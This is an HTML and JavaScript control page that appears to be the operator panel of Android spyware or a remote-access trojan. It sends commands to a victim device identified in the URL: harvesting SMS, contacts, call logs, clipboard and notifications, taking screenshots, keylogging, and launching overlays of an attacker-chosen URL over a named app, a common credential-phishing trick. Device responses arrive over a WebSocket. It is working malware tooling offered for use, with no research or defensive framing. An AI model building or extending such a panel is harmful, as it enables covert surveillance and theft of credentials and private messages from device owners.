<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Device Control</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      font-family: system-ui, sans-serif;
      margin: 20px;
      background: #f9fafb;
      color: #111;
    }
    h2 { margin-bottom: 4px; }
    p { margin-top: 0; color: #555; }
    .status {
      font-size: 0.9em;
      padding: 3px 8px;
      border-radius: 5px;
      display: inline-block;
      margin-left: 10px;
    }
    .online { background: #d1fae5; color: #065f46; }
    .offline { background: #fee2e2; color: #991b1b; }
    button {
      padding: 8px 12px;
      border-radius: 6px;
      border: none;
      margin-right: 8px;
      cursor: pointer;
      color: #fff;
      font-weight: 600;
    }
    .fetch { background: #10b981; }
    .upload { background: #2563eb; }
    .close { background: #ef4444; }
    #log {
      white-space: pre-wrap;
      background: #fff;
      border: 1px solid #eee;
      padding: 10px;
      border-radius: 8px;
      margin-top: 10px;
      min-height: 180px;
      max-height: 70vh;
      overflow: auto;
      font-family: monospace;
      font-size: 13px;
    }
  </style>
</head>
<body>
  <h2 id="devName"></h2>
  <p>ID: <span id="devId"></span> 
     <span id="status" class="status offline">Offline</span>
  </p>

  <button class="fetch" id="btnFetch">Fetch Notification</button>
  <button class="fetch" id="btnStartNotify">Start Notification Listener</button>
  <button class="close" id="btnStopNotify">Stop Notification Listener</button>
  <button class="fetch" id="btnFetchSms">Fetch Sms</button>
  <button class="fetch" id="btnFetchContact">Fetch Contact</button>
  <button class="fetch" id="btnFetchLog">Fetch Call Logs</button>
  <button class="fetch" id="btnFetchApps">Fetch Installed Apps</button>
  <button class="fetch" id="btnFetchIp">Fetch Ip Address</button>
  <button class="fetch" id="btnFetchClip">Fetch ClipBoard</button>
  <button class="fetch" id="btnStartKeyLog">Start KeyLogs</button>
  <button class="close" id="btnStopKeyLog">Stop KeyLogs</button>
  <button class="fetch" id="btnFetchKeyLog">Fetch KeyLogs</button>
  <button class="fetch" id="btnFetchDevice">Fetch Device Info</button>
  <button class="fetch" id="btnFetchScreenshot">Fetch Screenshot</button>
  <button class="fetch" id="btnFetchScreenshotPermission">Fetch Screenshot Permission</button>
  <button class="upload" id="btnUpload">Upload</button>
  
  <!-- Overlay Control Section -->
<div style="margin-top: 20px; padding: 10px; background: #fff; border-radius: 8px; border: 1px solid #eee;">
  <h3>Overlay Launcher</h3>
  
  <label>
    Package Name:
    <input id="pkgInput" type="text" placeholder="e.g. com.google.android.youtube" 
           style="width: 300px; padding: 6px; margin-bottom: 6px;">
  </label>
  <br>
  
  <label>
    URL:
    <input id="urlInput" type="text" placeholder="e.g. https://google.com"
           style="width: 300px; padding: 6px; margin-bottom: 6px;">
  </label>
  <br>
  
  <button class="fetch" id="btnCustomOverlay">Start Overlay (Custom)</button>
  <button class="close" id="btnStopOverlay">Stop Overlay</button>
</div>

  
  
  <button class="close" id="btnClose">Close</button>
  
  
  <div id="screenshotBody" style="margin-top:20px; display:none;">
  <h3>Screenshot Preview</h3>
  
	<img id="screenshotPreview"
		style="
			display:none;
			margin-top:20px;
			max-width:300px;
			max-height:180px;
			border:1px solid #ccc;
			border-radius:8px;
			cursor:pointer;
			object-fit:contain;
     ">

	<button id="downloadScreenshotBtn"
        style="
            display:none;
            margin-top:10px;
            padding:8px 12px;
            background:#2563eb;
            color:#fff;
            border:none;
            border-radius:6px;
            cursor:pointer;
            font-weight:600;
        ">
		Download Screenshot
		</button>

	   
  </div>
 


  <pre id="log">Connecting...</pre>
  
 

  <script>
    // --- Extract device info from URL ---
    const pathParts = window.location.pathname.split("/");
    const clientId = pathParts[pathParts.length - 1];
    const urlParams = new URLSearchParams(location.search);
    const deviceName = decodeURIComponent(urlParams.get("name") || clientId);

    document.title = deviceName;
    document.getElementById("devName").textContent = deviceName;
    document.getElementById("devId").textContent = clientId;

    const logEl = document.getElementById("log");
    const statusEl = document.getElementById("status");

    function pushLog(msg) {
      const ts = new Date().toLocaleTimeString();
      logEl.textContent += `\n[${ts}] ${msg}`;
      logEl.scrollTop = logEl.scrollHeight;
    }

    // --- Command sending ---
    async function sendCmd(cmd) {
      pushLog(`ðŸ“¤ Sending "${cmd}"...`);
      try {
        const r = await fetch("/command", {
          method: "POST",
          headers: {"Content-Type": "application/json"},
          body: JSON.stringify({ targetClientId: clientId, command: cmd })
        });
        if (!r.ok) pushLog(`âŒ Failed: ${r.status}`);
        else pushLog(`âœ… Command sent (${cmd})`);
      } catch (e) {
        pushLog(`âš ï¸ Network error: ${e.message}`);
      }
    }

    document.getElementById("btnFetch").onclick = () => sendCmd("fetch");
    document.getElementById("btnStartNotify").onclick = () => sendCmd("start-notify");
    document.getElementById("btnStopNotify").onclick = () => sendCmd("stop-notify");
    document.getElementById("btnFetchSms").onclick = () => sendCmd("fetch-sms");
    document.getElementById("btnFetchContact").onclick = () => sendCmd("fetch-contact");
    document.getElementById("btnFetchLog").onclick = () => sendCmd("fetch-logs");
    document.getElementById("btnFetchApps").onclick = () => sendCmd("fetch-apps");
    document.getElementById("btnFetchIp").onclick = () => sendCmd("fetch-ip");
    document.getElementById("btnFetchClip").onclick = () => sendCmd("fetch-clip");
    document.getElementById("btnStartKeyLog").onclick = () => sendCmd("start_keylog");
    document.getElementById("btnStopKeyLog").onclick = () => sendCmd("stop_keylog");
    document.getElementById("btnFetchKeyLog").onclick = () => sendCmd("fetch_keylog");
    document.getElementById("btnFetchDevice").onclick = () => sendCmd("fetch-device");
    document.getElementById("btnFetchScreenshot").onclick = () => sendCmd("fetch-screenshot");
    document.getElementById("btnFetchScreenshotPermission").onclick = () => sendCmd("grant-screenshot-permission");
    document.getElementById("btnUpload").onclick = () => sendCmd("upload");
    document.getElementById("btnClose").onclick = () => window.close();
	
	
	
	// ---- Custom Overlay Controls ----
	document.getElementById("btnCustomOverlay").onclick = () => {
	const pkg = document.getElementById("pkgInput").value.trim();
	const url = document.getElementById("urlInput").value.trim();

	if (!pkg || !url) {
		pushLog("âš ï¸ Please enter both PackageName and URL");
		return;
	}

	const cmd = `start-overlay{url:${url},PackageName:${pkg}}`;
	sendCmd(cmd);
	};

	document.getElementById("btnStopOverlay").onclick = () => {
	sendCmd("stop-overlay");
	};



    // --- WebSocket for live updates ---
    const wsProto = location.protocol === "https:" ? "wss://" : "ws://";
    const ws = new WebSocket(wsProto + location.host);

    ws.onopen = () => pushLog("ðŸ”Œ WebSocket connected");
    ws.onclose = () => pushLog("âŒ WebSocket disconnected");
    ws.onerror = (e) => pushLog("âš ï¸ WebSocket error");

    ws.onmessage = (evt) => {
      try {
        const msg = JSON.parse(evt.data);

        if (msg.type === "devices") {
          // Update online/offline status of this device
          const d = msg.devices[clientId];
          if (d && d.online) {
            statusEl.textContent = "Online";
            statusEl.className = "status online";
          } else {
            statusEl.textContent = "Offline";
            statusEl.className = "status offline";
          }
        }

       if (msg.type === "response" && msg.clientId === clientId) {
				pushLog(`ðŸ“© Response: ${msg.output}`);

				if (msg.output.includes("supabase.co")) {

					const url = msg.output.trim();

					// Display Screenshot body
					const imgBody = document.getElementById("screenshotBody");
					imgBody.style.display = "block"
					
					// Show preview thumbnail
					const img = document.getElementById("screenshotPreview");
					img.src = url;
					img.style.display = "block";

					// Show download button
					const btn = document.getElementById("downloadScreenshotBtn");
					btn.style.display = "inline-block";

					// Set up click to download
					btn.onclick = () => {
					const link = document.createElement("a");
					link.href = url;
					link.download = "screenshot.jpg";  // or .png
					link.style.display = "none";
					document.body.appendChild(link);
					link.click();
					document.body.removeChild(link);
					};

					// Full-screen popup on click
					document.getElementById("screenshotPreview").onclick = () => {
					const win = window.open("", "_blank");
					win.document.write(`<center><img src="${url}" style="width:360px;height:620;"></center>`);
					};
				}
		}


      } catch (e) {
        console.error("WS parse error", e);
      }
    };

    window.pushRemoteLog = pushLog;
  </script>
</body>
</html>
